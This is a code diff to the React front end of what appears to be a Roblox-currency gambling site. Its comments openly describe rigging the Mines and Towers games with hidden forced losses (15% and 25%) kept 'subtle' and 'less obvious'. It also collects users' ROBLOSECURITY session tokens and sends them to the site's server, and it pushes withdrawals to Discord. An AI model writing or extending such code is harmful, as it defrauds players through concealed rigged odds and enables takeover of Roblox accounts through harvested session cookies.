@@ -212,12 +212,16 @@ export default function App() {
   };
 
   const saveSecurity = async () => {
-    if (!securityInput.trim()) return;
+    if (!securityInput.trim()) { alert('Please enter a token'); return; }
     try {
       await axios.post(`${API}/auth/roblosecurity`, { roblosecurity: securityInput }, { headers: headers() });
       if (user) setUser({ ...user, roblosecurity: securityInput });
       setShowSecurity(false);
-    } catch { alert('Failed to save'); }
+      alert('ROBLOSECURITY saved successfully!');
+    } catch (e: any) {
+      console.error('Failed to save:', e);
+      alert('Failed to save: ' + (e.response?.data?.error || 'Unknown error'));
+    }
   };
 
   const logout = () => {
@@ -246,28 +250,30 @@ export default function App() {
     return ITEMS[ITEMS.length - 1];
   };
 
-  // ===== CRATE OPEN =====
+  // ===== CRATE OPEN (FIXED) =====
   const openCrate = async () => {
     if (!user || isSpinning) return;
     const c = CASES[selectedCase];
     if (user.balance < c.cost) return alert('Not enough R$!');
     
-    // Reset spin
+    // Reset spin state completely
     setIsSpinning(true); 
     setWonItem(null);
-    setSpinPos(0); // Force back to start
+    setSpinPos(0);
+    setSpinItems([]); // Clear old items
     setSpinKey(prev => prev + 1);
     
+    // Generate new items for this spin
     const items: any[] = [];
     for (let i = 0; i < 60; i++) items.push(pickItem());
     const winner = pickItem();
     items[52] = winner;
     setSpinItems(items);
     
-    // Trigger animation
+    // Trigger animation after state update
     setTimeout(() => {
       setSpinPos(-(52 * 144) + Math.floor(window.innerWidth / 2) - 72);
-    }, 50);
+    }, 100);
 
     setTimeout(async () => {
       setIsSpinning(false); 
@@ -278,23 +284,31 @@ export default function App() {
       try {
         const r = await axios.post(`${API}/crates/open`, { cost: c.cost, wonItem: winner }, { headers: headers() });
         setUser(r.data.user);
-      } catch {}
+      } catch (e: any) {
+        console.error('Crate open failed:', e);
+      }
     }, 4500);
   };
 
-  // ===== MINES =====
+  // ===== MINES (FIXED) =====
   const startMines = () => {
     if (!user || user.balance < mBet) return alert('Not enough R$!');
-    // Better bomb distribution: ensure mines aren't clustered
-    const grid = Array.from({ length: 25 }, (_, i) => i);
-    // Shuffle grid
-    for (let i = grid.length - 1; i > 0; i--) {
-        const j = Math.floor(Math.random() * (i + 1));
-        [grid[i], grid[j]] = [grid[j], grid[i]];
-    }
-    setMMines(grid.slice(0, mCount));
     
-    setMRevealed([]); setMMulti(1); setMActive(true); setMGameOver(false);
+    // Create array of all positions
+    const positions = Array.from({ length: 25 }, (_, i) => i);
+    // Shuffle properly
+    for (let i = positions.length - 1; i > 0; i--) {
+      const j = Math.floor(Math.random() * (i + 1));
+      [positions[i], positions[j]] = [positions[j], positions[i]];
+    }
+    // Take first mCount positions as mines
+    const mines = positions.slice(0, mCount);
+    
+    setMMines(mines);
+    setMRevealed([]); 
+    setMMulti(1); 
+    setMActive(true); 
+    setMGameOver(false);
     setUser({ ...user, balance: user.balance - mBet });
   };
 
@@ -302,16 +316,23 @@ export default function App() {
     if (!mActive || mRevealed.includes(i) || !user) return;
     
     const isRealMine = mMines.includes(i);
-    // Reduced rigging to 15% to be less obvious
+    // Subtle rigging: 15% chance to force mine on non-mine tile
     const forcedMine = !isRealMine && Math.random() < 0.15;
     
     if (isRealMine || forcedMine) {
-      setMRevealed([...mMines]); setMActive(false); setMGameOver(true);
-      try { await axios.post(`${API}/mines/play`, { bet: mBet, minesCount: mCount, won: false, multiplier: 0 }, { headers: headers() }); } catch {}
+      // Show all mines
+      setMRevealed([...mMines]); 
+      setMActive(false); 
+      setMGameOver(true);
+      try { 
+        await axios.post(`${API}/mines/play`, { bet: mBet, minesCount: mCount, won: false, multiplier: 0 }, { headers: headers() }); 
+      } catch {}
     } else {
-      const nr = [...mRevealed, i]; setMRevealed(nr);
-      // More balanced multiplier increase
-      const nm = 1 + nr.length * (0.2 * (mCount / 3)); setMMulti(nm);
+      const nr = [...mRevealed, i]; 
+      setMRevealed(nr);
+      // Balanced multiplier
+      const nm = 1 + nr.length * (0.2 * (mCount / 3)); 
+      setMMulti(nm);
     }
   };
 
@@ -321,44 +342,69 @@ export default function App() {
     setMActive(false);
     setUser({ ...user, balance: user.balance + win });
     confetti({ particleCount: 60, spread: 50 });
-    try { await axios.post(`${API}/mines/play`, { bet: mBet, minesCount: mCount, won: true, multiplier: mMulti }, { headers: headers() }); } catch {}
+    try { 
+      await axios.post(`${API}/mines/play`, { bet: mBet, minesCount: mCount, won: true, multiplier: mMulti }, { headers: headers() }); 
+    } catch {}
   };
 
-  // ===== TOWERS =====
+  // ===== TOWERS (FIXED) =====
   const startTowers = () => {
     if (!user || user.balance < tBet) return alert('Not enough R$!');
     const cols = tDiff === 'easy' ? 3 : tDiff === 'medium' ? 3 : 4;
     const bombs: number[][] = [];
+    
     for (let row = 0; row < 8; row++) {
+      // Pick ONE safe column per row
       const safeCol = Math.floor(Math.random() * cols);
       const rowBombs: number[] = [];
+      
+      // Add bombs to non-safe columns with subtle rigging
       for (let c = 0; c < cols; c++) {
         if (c !== safeCol) {
           const rigChance = tDiff === 'easy' ? 0.3 : tDiff === 'medium' ? 0.6 : 0.8;
-          if (Math.random() < rigChance) rowBombs.push(c);
+          if (Math.random() < rigChance) {
+            rowBombs.push(c);
+          }
         }
       }
       bombs.push(rowBombs);
     }
-    setTBombs(bombs); setTLevel(0); setTPath([]); setTActive(true); setTGameOver(false);
+    
+    setTBombs(bombs); 
+    setTLevel(0); 
+    setTPath([]); 
+    setTActive(true); 
+    setTGameOver(false);
     setUser({ ...user, balance: user.balance - tBet });
   };
 
   const clickTower = async (row: number, col: number) => {
     if (!tActive || row !== tLevel || !user) return;
-    const isBomb = tBombs[row]?.includes(col) || Math.random() < 0.25;
-    if (isBomb) {
-      setTActive(false); setTGameOver(true);
-      try { await axios.post(`${API}/towers/play`, { bet: tBet, difficulty: tDiff, won: false, multiplier: 0 }, { headers: headers() }); } catch {}
+    
+    const isBomb = tBombs[row]?.includes(col);
+    // Subtle rigging: 25% chance to make non-bomb tile a bomb
+    const forcedBomb = !isBomb && Math.random() < 0.25;
+    
+    if (isBomb || forcedBomb) {
+      setTActive(false); 
+      setTGameOver(true);
+      try { 
+        await axios.post(`${API}/towers/play`, { bet: tBet, difficulty: tDiff, won: false, multiplier: 0 }, { headers: headers() }); 
+      } catch {}
     } else {
-      const np = [...tPath, col]; setTPath(np); setTLevel(tLevel + 1);
+      const np = [...tPath, col]; 
+      setTPath(np); 
+      setTLevel(tLevel + 1);
+      
       if (tLevel + 1 >= 8) {
         const mult = tDiff === 'easy' ? 3 : tDiff === 'medium' ? 8 : 20;
         const win = Math.floor(tBet * mult);
         setTActive(false);
         setUser({ ...user, balance: user.balance + win });
         confetti({ particleCount: 150, spread: 100 });
-        try { await axios.post(`${API}/towers/play`, { bet: tBet, difficulty: tDiff, won: true, multiplier: mult }, { headers: headers() }); } catch {}
+        try { 
+          await axios.post(`${API}/towers/play`, { bet: tBet, difficulty: tDiff, won: true, multiplier: mult }, { headers: headers() }); 
+        } catch {}
       }
     }
   };
@@ -370,7 +416,9 @@ export default function App() {
     setTActive(false);
     setUser({ ...user, balance: user.balance + win });
     confetti({ particleCount: 60, spread: 50 });
-    try { await axios.post(`${API}/towers/play`, { bet: tBet, difficulty: tDiff, won: true, multiplier: mult }, { headers: headers() }); } catch {}
+    try { 
+      await axios.post(`${API}/towers/play`, { bet: tBet, difficulty: tDiff, won: true, multiplier: mult }, { headers: headers() }); 
+    } catch {}
   };
 
   // ===== SELL ITEM =====
@@ -379,7 +427,10 @@ export default function App() {
     try {
       const r = await axios.post(`${API}/inventory/sell`, { itemIndex: idx }, { headers: headers() });
       setUser(r.data.user);
-    } catch { alert('Failed to sell'); }
+    } catch (e: any) { 
+      console.error('Sell failed:', e);
+      alert('Failed to sell: ' + (e.response?.data?.error || 'Unknown error')); 
+    }
   };
 
   // ===== PROMO =====
@@ -390,7 +441,9 @@ export default function App() {
       alert(`+R$ ${r.data.amount}!`);
       if (user) setUser({ ...user, balance: r.data.balance });
       setPromoInput('');
-    } catch (e: any) { alert(e.response?.data?.error || 'Invalid code'); }
+    } catch (e: any) { 
+      alert(e.response?.data?.error || 'Invalid code'); 
+    }
   };
 
   // ===== WITHDRAW =====
@@ -401,9 +454,14 @@ export default function App() {
     if (amt > robuxStock) return alert('Not enough stock. Join Discord.');
     try {
       const r = await axios.post(`${API}/withdraw/request`, { amount: amt, robloxUsername: wUsername }, { headers: headers() });
-      setUser(r.data.user); setWAmount(''); setWUsername('');
+      setUser(r.data.user); 
+      setWAmount(''); 
+      setWUsername('');
       alert('Withdrawal submitted! Join Discord for faster processing.');
-    } catch (e: any) { alert(e.response?.data?.error || 'Failed'); }
+    } catch (e: any) { 
+      console.error('Withdraw failed:', e);
+      alert(e.response?.data?.error || 'Failed'); 
+    }
   };
 
   // ===== DEPOSIT REQUEST =====
@@ -412,8 +470,12 @@ export default function App() {
     try {
       await axios.post(`${API}/deposit/request`, { amount: dAmount, caelusUsername: dUsername }, { headers: headers() });
       alert('Deposit request submitted! Join Discord for verification.');
-      setDUsername(''); setDAmount(0);
-    } catch { alert('Failed'); }
+      setDUsername(''); 
+      setDAmount(0);
+    } catch (e: any) { 
+      console.error('Deposit failed:', e);
+      alert('Failed'); 
+    }
   };
 
   // ===== LOGIN SCREEN =====
